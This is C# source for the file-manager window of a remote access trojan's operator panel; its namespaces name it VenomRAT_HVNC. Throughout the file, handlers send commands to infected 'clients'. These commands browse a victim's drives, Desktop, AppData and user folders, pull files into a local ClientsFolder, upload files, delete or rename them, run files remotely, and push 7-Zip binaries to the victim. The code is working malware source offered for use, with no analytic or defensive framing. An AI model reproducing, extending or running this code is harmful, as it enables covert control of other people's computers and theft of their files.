using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using VenomRAT_HVNC.Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Properties;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormFileManager : Form
    {
        public Form1 F { get; set; }

        internal Clients Client { get; set; }

        public string FullPath { get; set; }

        public FormFileManager()
        {
            this.InitializeComponent();
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count == 1)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "getPath";
                    msgPack.ForcePathObject("Path").AsString = this.listView1.SelectedItems[0].ToolTipText;
                    this.listView1.Enabled = false;
                    this.toolStripStatusLabel3.ForeColor = Color.Green;
                    this.toolStripStatusLabel3.Text = "Please Wait";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                string text = this.toolStripStatusLabel1.Text;
                if (text.Length <= 3)
                {
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "getDrivers";
                    this.toolStripStatusLabel1.Text = "";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
                else
                {
                    text = text.Remove(text.LastIndexOfAny(new char[] { '\\' }, text.LastIndexOf('\\')));
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "getPath";
                    msgPack.ForcePathObject("Path").AsString = text + "\\";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack2.ForcePathObject("Command").AsString = "getDrivers";
                this.toolStripStatusLabel1.Text = "";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count > 0)
                {
                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID)))
                    {
                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID));
                    }
                    foreach (object obj in this.listView1.SelectedItems)
                    {
                        ListViewItem listViewItem = (ListViewItem)obj;
                        if (listViewItem.ImageIndex == 0 && listViewItem.ImageIndex == 1 && listViewItem.ImageIndex == 2)
                        {
                            break;
                        }
                        MsgPack msgPack = new MsgPack();
                        string dwid = Guid.NewGuid().ToString();
                        msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                        msgPack.ForcePathObject("Command").AsString = "socketDownload";
                        msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
                        msgPack.ForcePathObject("DWID").AsString = dwid;
                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                        base.BeginInvoke(new MethodInvoker(delegate ()
                        {
                            if ((FormDownloadFile)Application.OpenForms["socketDownload:" + dwid] == null)
                            {
                                FormDownloadFile formDownloadFile = new FormDownloadFile
                                {
                                    Name = "socketDownload:" + dwid,
                                    Text = "socketDownload:" + this.Client.ID,
                                    F = this.F,
                                    DirPath = this.FullPath
                                };
                                formDownloadFile.Show();
                            }
                        }));
                    }
                }
            }
            catch
            {
            }
        }

        private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.toolStripStatusLabel1.Text.Length >= 3)
            {
                try
                {
                    OpenFileDialog openFileDialog = new OpenFileDialog();
                    openFileDialog.Multiselect = true;
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        foreach (string text in openFileDialog.FileNames)
                        {
                            if ((FormDownloadFile)Application.OpenForms["socketDownload:"] == null)
                            {
                                FormDownloadFile formDownloadFile = new FormDownloadFile
                                {
                                    Name = "socketUpload:" + Guid.NewGuid().ToString(),
                                    Text = "socketUpload:" + this.Client.ID,
                                    F = Program.form1,
                                    Client = this.Client
                                };
                                formDownloadFile.FileSize = new FileInfo(text).Length;
                                formDownloadFile.labelfile.Text = Path.GetFileName(text);
                                formDownloadFile.FullFileName = text;
                                formDownloadFile.label1.Text = "Upload:";
                                formDownloadFile.ClientFullFileName = this.toolStripStatusLabel1.Text + "\\" + Path.GetFileName(text);
                                MsgPack msgPack = new MsgPack();
                                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                                msgPack.ForcePathObject("Command").AsString = "reqUploadFile";
                                msgPack.ForcePathObject("ID").AsString = formDownloadFile.Name;
                                formDownloadFile.Show();
                                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                            }
                        }
                    }
                }
                catch
                {
                }
            }
        }

        private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count > 0)
                {
                    foreach (object obj in this.listView1.SelectedItems)
                    {
                        ListViewItem listViewItem = (ListViewItem)obj;
                        if (listViewItem.ImageIndex != 0 && listViewItem.ImageIndex != 1 && listViewItem.ImageIndex != 2)
                        {
                            MsgPack msgPack = new MsgPack();
                            msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                            msgPack.ForcePathObject("Command").AsString = "deleteFile";
                            msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
                            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                        }
                        else if (listViewItem.ImageIndex == 0)
                        {
                            MsgPack msgPack2 = new MsgPack();
                            msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
                            msgPack2.ForcePathObject("Command").AsString = "deleteFolder";
                            msgPack2.ForcePathObject("Folder").AsString = listViewItem.ToolTipText;
                            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
                        }
                    }
                }
            }
            catch
            {
            }
        }

        private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.toolStripStatusLabel1.Text != "")
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "getPath";
                    msgPack.ForcePathObject("Path").AsString = this.toolStripStatusLabel1.Text;
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
                else
                {
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack2.ForcePathObject("Command").AsString = "getDrivers";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count > 0)
                {
                    foreach (object obj in this.listView1.SelectedItems)
                    {
                        ListViewItem listViewItem = (ListViewItem)obj;
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                        msgPack.ForcePathObject("Command").AsString = "execute";
                        msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                    }
                }
            }
            catch
            {
            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getPath";
                msgPack.ForcePathObject("Path").AsString = "DESKTOP";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
            catch
            {
            }
        }

        private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getPath";
                msgPack.ForcePathObject("Path").AsString = "APPDATA";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
            catch
            {
            }
        }

        private void CreateFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string text = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""), -1, -1);
                if (!string.IsNullOrEmpty(text))
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "createFolder";
                    msgPack.ForcePathObject("Folder").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count > 0)
                {
                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (object obj in this.listView1.SelectedItems)
                    {
                        ListViewItem listViewItem = (ListViewItem)obj;
                        stringBuilder.Append(listViewItem.ToolTipText + "-=>");
                    }
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "copyFile";
                    msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
                    msgPack.ForcePathObject("IO").AsString = "copy";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "pasteFile";
                msgPack.ForcePathObject("File").AsString = this.toolStripStatusLabel1.Text;
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
            catch
            {
            }
        }

        private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count == 1)
            {
                try
                {
                    string text = Interaction.InputBox("Rename File or Folder", "Name", this.listView1.SelectedItems[0].Text, -1, -1);
                    if (!string.IsNullOrEmpty(text))
                    {
                        if (this.listView1.SelectedItems[0].ImageIndex != 0 && this.listView1.SelectedItems[0].ImageIndex != 1 && this.listView1.SelectedItems[0].ImageIndex != 2)
                        {
                            MsgPack msgPack = new MsgPack();
                            msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                            msgPack.ForcePathObject("Command").AsString = "renameFile";
                            msgPack.ForcePathObject("File").AsString = this.listView1.SelectedItems[0].ToolTipText;
                            msgPack.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
                            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                        }
                        else if (this.listView1.SelectedItems[0].ImageIndex == 0)
                        {
                            MsgPack msgPack2 = new MsgPack();
                            msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
                            msgPack2.ForcePathObject("Command").AsString = "renameFolder";
                            msgPack2.ForcePathObject("Folder").AsString = this.listView1.SelectedItems[0].ToolTipText + "\\";
                            msgPack2.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
                            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
                        }
                    }
                }
                catch
                {
                }
            }
        }

        private void UserProfileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getPath";
                msgPack.ForcePathObject("Path").AsString = "USER";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
            catch
            {
            }
        }

        private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "getDrivers";
            this.toolStripStatusLabel1.Text = "";
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(this.FullPath))
                {
                    Directory.CreateDirectory(this.FullPath);
                }
                Process.Start(this.FullPath);
            }
            catch
            {
            }
        }

        private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
        {
            ThreadPool.QueueUserWorkItem(delegate (object o)
            {
                Clients client = this.Client;
                if (client == null)
                {
                    return;
                }
                client.Disconnected();
            });
        }

        private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count > 0)
                {
                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (object obj in this.listView1.SelectedItems)
                    {
                        ListViewItem listViewItem = (ListViewItem)obj;
                        stringBuilder.Append(listViewItem.ToolTipText + "-=>");
                    }
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "copyFile";
                    msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
                    msgPack.ForcePathObject("IO").AsString = "cut";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count > 0)
                {
                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (object obj in this.listView1.SelectedItems)
                    {
                        ListViewItem listViewItem = (ListViewItem)obj;
                        stringBuilder.Append(listViewItem.ToolTipText + "-=>");
                    }
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "zip";
                    msgPack.ForcePathObject("Path").AsString = stringBuilder.ToString();
                    msgPack.ForcePathObject("Zip").AsString = "true";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        private void UnzipToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.listView1.SelectedItems.Count > 0)
                {
                    foreach (object obj in this.listView1.SelectedItems)
                    {
                        ListViewItem listViewItem = (ListViewItem)obj;
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                        msgPack.ForcePathObject("Command").AsString = "zip";
                        msgPack.ForcePathObject("Path").AsString = listViewItem.ToolTipText;
                        msgPack.ForcePathObject("Zip").AsString = "false";
                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                    }
                }
            }
            catch
            {
            }
        }

        private void InstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "installZip";
            msgPack.ForcePathObject("exe").SetAsBytes(Resources._7z);
            msgPack.ForcePathObject("dll").SetAsBytes(Resources._7z1);
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                string text = this.toolStripStatusLabel1.Text;
                if (text.Length <= 3)
                {
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "getDrivers";
                    this.toolStripStatusLabel1.Text = "";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
                else
                {
                    text = text.Remove(text.LastIndexOfAny(new char[] { '\\' }, text.LastIndexOf('\\')));
                    msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                    msgPack.ForcePathObject("Command").AsString = "getPath";
                    msgPack.ForcePathObject("Path").AsString = text + "\\";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack2.ForcePathObject("Command").AsString = "getDrivers";
                this.toolStripStatusLabel1.Text = "";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
            }
        }

        private void guna2Button1_Click_1(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "getPath";
                msgPack.ForcePathObject("Path").AsString = "DESKTOP";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
            catch
            {
            }
        }
    }
}
